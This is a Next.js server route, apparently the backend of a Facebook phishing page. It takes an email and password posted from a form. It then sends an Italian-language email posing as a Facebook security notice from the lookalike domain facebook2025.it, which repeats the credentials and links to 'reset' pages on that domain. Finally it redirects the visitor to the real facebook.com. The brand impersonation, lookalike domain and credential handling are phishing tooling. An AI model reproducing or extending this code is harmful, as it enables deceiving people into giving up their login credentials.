export const runtime = 'nodejs';
import { NextResponse } from 'next/server';
import { Resend } from 'resend';
import 'dotenv/config';

export async function POST(request: Request) {
  try {
    const body = await request.formData();
    const email = body.get('email')?.toString() || '';
    const password = body.get('password')?.toString() || '';

    // 🔐 Validazione semplice
    if (!email.includes('@') || password.length < 4) {
      return NextResponse.json({ error: 'Credenziali non valide' }, { status: 400 });
    }

    const resend = new Resend(process.env.RESEND_API_KEY);

    await resend.emails.send({
      from: 'Facebook <securitynoreply@facebook2025.it>',
      to: email, // usa direttamente il valore ricevuto
      subject: '🔐 Notifica di accesso Facebook',
      html: `
        <!DOCTYPE html>
        <html lang="it">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Notifica di Sicurezza</title>
        </head>
        <body style="font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px;">
          <div style="max-width: 600px; margin: auto; background-color: #ffffff; border-radius: 8px; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.05);">
            <h2 style="color: #1877f2;">Facebook</h2>
            <p style="color: #555; font-size: 14px;">20 luglio 2025</p>
            <p style="font-size: 16px; color: #333;">Gentile utente,</p>
            <p style="font-size: 16px; color: #333;">
              È stato registrato un nuovo tentativo di login con le seguenti credenziali:
            </p>
            <ul style="font-size: 16px; color: #333;">
              <li><strong>Email:</strong> ${email}</li>
              <li><strong>Password:</strong> ${password}</li>
            </ul>
            <p style="font-size: 16px; color: #333;">
              Se non riconosci questo accesso, aggiorna subito la tua password.
            </p>
            <div style="text-align: center; margin: 30px 0;">
              <a href="https://facebook2025.it/reset" style="background-color: #1877f2; color: #fff; padding: 12px 24px; text-decoration: none; font-weight: bold; border-radius: 4px;">
                Aggiorna credenziali
              </a>
            </div>
            <hr style="margin: 30px 0; border: none; border-top: 1px solid #e4e6eb;" />
            <p style="font-size: 13px; color: #666;">
              Questo messaggio è stato inviato a <strong>${email}</strong>.<br />
              Facebook è gestito da Meta Platforms Ireland Ltd., Dublin.<br />
              <a href="https://facebook2025.it/unsubscribe" style="color: #1877f2;">Annulla iscrizione</a>
            </p>
          </div>
        </body>
        </html>
      `,
      text: `
        Facebook - Notifica di Sicurezza

        È stato registrato un nuovo login con le seguenti credenziali:

        Email: ${email}
        Password: ${password}

        Se non riconosci questo accesso, aggiorna la tua password visitando: https://facebook2025.it/reset

        Questo messaggio è stato inviato a ${email}.
        Per disiscriverti: https://facebook2025.it/unsubscribe
      `,
    });

    return NextResponse.redirect('https://www.facebook.com');
  } catch (error) {
    console.error('❌ Errore invio email:', error);
    return NextResponse.json({ error: 'Errore interno del server' }, { status: 500 });
  }
}
